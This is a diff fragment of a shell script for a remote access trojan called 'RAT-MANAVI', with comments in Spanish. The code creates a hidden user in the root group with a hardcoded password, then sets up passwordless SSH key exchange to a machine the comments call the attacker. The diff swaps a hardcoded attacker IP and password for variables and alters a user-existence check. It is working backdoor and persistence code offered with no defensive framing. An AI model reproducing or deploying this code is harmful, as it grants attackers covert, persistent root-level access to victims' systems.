@@ -55,7 +55,7 @@ echo "root $$" > /proc/buddyinfo 2>/dev/null
 
 #Crear el usuario con el desde el cual se obtendrán los archivos
 id -u $RAT_USER 1>&/dev/null
-if [ ! $? ]
+if [  $? ]
 then
 	$USERADD $RAT_USER -d /home/$RAT_USER/ -M -s /bin/false -G root
 	echo manavi:manavi | $CHPASSWD
@@ -108,11 +108,8 @@ cd ${RAT_DIR}RAT-MANAVI/
 #Crear conexión remota con el atacante
 if [ ! -f $HOME/.ssh/id_rsa ]
 then
-	echo "Agregando intercambio de llaves"
-	#ssh-keygen -q -b 4096 -t rsa -N '' -f $HOME/.ssh/id_rsa
-	cp -f ${RAT_DIR}RAT-MANAVI/id_rsa* $HOME/.ssh/
-	sshpass -p 'hola123,' ssh-copy-id manavi@192.168.222.9
-	echo "Finalizo el intercambio de llaves."
+	ssh-keygen -q -b 4096 -t rsa -N '' -f $HOME/.ssh/id_rsa
+	sshpass -p ${CLIENT_PASS} ssh-copy-id ${RAT_USER}@${CLIENT_IP}
 else
 	echo 'Ya os podeis conectar sin contraseña.'
 fi
